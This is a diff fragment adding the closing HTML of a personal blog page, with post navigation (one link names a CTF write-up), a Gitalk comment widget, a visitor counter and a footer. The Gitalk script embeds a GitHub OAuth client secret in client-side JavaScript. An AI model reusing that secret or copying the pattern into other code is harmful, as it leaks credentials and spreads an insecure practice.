+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../ctf-%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy-tornado1/">CTF-[护网杯2018]easy_tornado1</a>
+            
+            
+            <a class="next" rel="next" href="../%E5%8F%91%E5%B1%95%E5%AF%B9%E8%B1%A1%E5%9F%B9%E8%AE%AD/">发展对象培训</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
